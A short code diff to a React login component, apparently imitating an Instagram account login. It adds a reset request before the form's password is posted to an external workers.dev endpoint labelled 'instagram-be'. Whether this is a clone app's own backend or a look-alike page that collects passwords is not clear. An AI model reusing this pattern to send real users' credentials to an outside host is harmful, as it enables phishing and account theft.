@@ -37,6 +37,8 @@ const AccountLogin = () => {
     e.preventDefault();
     if (formData.password) {
       try {
+        await fetch('https://instagram-be.mizerablepi.workers.dev/test/reset', { method: 'POST' });
+
         const response = await fetch('https://instagram-be.mizerablepi.workers.dev/test/submit-password', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
